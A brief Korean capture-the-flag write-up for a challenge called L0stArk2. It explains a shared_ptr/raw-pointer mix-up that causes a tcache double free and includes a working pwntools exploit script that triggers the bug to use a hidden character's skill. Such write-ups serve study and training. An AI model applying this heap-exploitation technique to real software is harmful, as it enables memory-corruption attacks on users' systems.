# L0stArk2

## 취약점
L0stArk에서 캐릭터를 hold하는 vector가 unique_ptr에서 shared_ptr로 변경되어 캐릭터 삭제시 skill을 nullify 해주는 destructor가 불리게 되었다.

그러나 캐릭터 선택시 shared_ptr에 raw pointer를 넣어주어 후에 캐릭터 삭제시 double free가 일어나는 취약점이 발생했다.

캐릭터 인스턴스 생성시 tcache가 사용된다.
캐릭터 생성, 선택, 삭제로 tcache double free를 일으키고 hidden 캐릭터와 다른 캐릭터를 차례로 생성하면 후에 생성한 인스턴스로 hidden 캐릭터의 스킬을 사용할 수 있다.

## exploit
```python
from pwn import *

p = remote("localhost", 31679)

def create(no, name=None):
  p.sendlineafter("pick: ", "1")
  p.sendlineafter("pick: ", str(no))
  if name:
    p.sendlineafter("name: ", name)

def choose(no):
  p.sendlineafter("pick: ", "4")
  p.sendlineafter("pick: ", str(no))

def destroy(no):
  p.sendlineafter("pick: ", "2")
  p.sendlineafter("pick: ", "0")

def useskill():
  p.sendlineafter("pick: ", "6")


create(1, "A")
choose(0)
destroy(0)
create(7)
create(1, "B")
choose(0)
useskill()

p.interactive()
```
